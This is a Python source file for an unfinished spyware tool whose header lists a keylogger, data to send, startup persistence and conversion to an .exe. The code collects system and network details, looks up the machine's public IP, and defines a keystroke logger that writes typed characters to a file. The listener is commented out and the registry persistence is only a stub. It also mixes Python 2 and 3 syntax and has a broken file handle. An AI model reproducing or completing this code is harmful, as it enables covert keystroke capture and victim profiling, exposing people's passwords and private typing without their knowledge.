#1. System Information [Done]
#2. Keylogger [Done]
#3. Data to send [Done]

#4. Automatic execution on system startup [Doing]
#5. Convert code to an image/.exe application

#requirements (windows)
# execute the respective commands in a windows cmd.
# -> python -m pip install psutil
# -> python -m pip install requests
# -> python -m pip install pynput
# -> python -m pip install --upgrade pip

import platform
import psutil
from datetime import datetime
from requests import get
from pynput import keyboard
from time import strftime,gmtime
import datetime
import json
import os

isWindowsOS = 0
keyloggerfiledir = "C:\\Users\\jorge.duarte\\Desktop\\Python-spyware\\output.txt"
senddata = { 'network' : [], 'system' : '' , 'ipaddress' : '' }



def ExecKeyLogger_OnKeyPress(key):
    try:
        f=open(keyloggerfiledir,"a")
        f.write(key.char)
    except AttributeError:
        if key==keyboard.Key.space:
            f.write(' ')
        if key==keyboard.Key.enter:
            f.write(os.linesep)
        if key==keyboard.Key.backspace:
            f.write('')
    except:
      print('Failed to catch numnomeric key')


def ExecKeyLogger_OnRelease(key):
    if int(datetime.datetime.now().strftime("%H")) not in range(8,23):
        return False

def GetExternalIP():
    try:
        ip = get('https://api.ipify.org').text
        senddata['ipaddress'] = ip
    except:
        print 'failed to retrieve public ip'


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return str(bytes) + " " + unit + suffix;
        bytes /= factor



def GetSystemInformation():
    #print("="*40, "System Information", "="*40)
    uname = platform.uname()
    senddata['system'] = uname;

def NetworkInformation():
    #print("="*40, "Network Information", "="*40)
    # get all network interfaces (virtual and physical)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            senddata['network'].append(address);
            #print("=== Interface: "+interface_name+" ===")
            #if str(address.family) == '2':
            #    if(address.address):
            #       print("  IP Address: " + address.address)
            #    if(address.netmask):
            #        print("  Netmask: "+ address.netmask)
            #    if(address.broadcast):
            #        print("  Broadcast IP: " + address.broadcast)
            #elif str(address.family) == '-1':
            #    if(address.address):
            #        print("  MAC Address: " + address.address)
            #    if(address.netmask):
            #        print("  Netmask: " + address.netmask)
            #    if(address.broadcast):
            #        print("  Broadcast MAC: " + address.broadcast)
            #else: # family 23 == ipv6?
            #    print(address)
    # get IO statistics since boot
    net_io = psutil.net_io_counters()
    #print("Total Bytes Sent: " + get_size(net_io.bytes_sent))
    #print("Total Bytes Received: " + get_size(net_io.bytes_recv))

    
def AddToRegistry():
    pth = os.path.dirname(os.path.realpath(__file__))
    ##print(pth);
    
        
GetSystemInformation()
NetworkInformation()
AddToRegistry()
GetExternalIP()

jstr = json.dumps(senddata, indent=4)
print(jstr);


#activate keylogger 

#try:
#    with keyboard.Listener(on_press=ExecKeyLogger_OnKeyPress,on_release=ExecKeyLogger_OnRelease) as listener:
#        listener.join()
#except:
#    print("fix this ****")
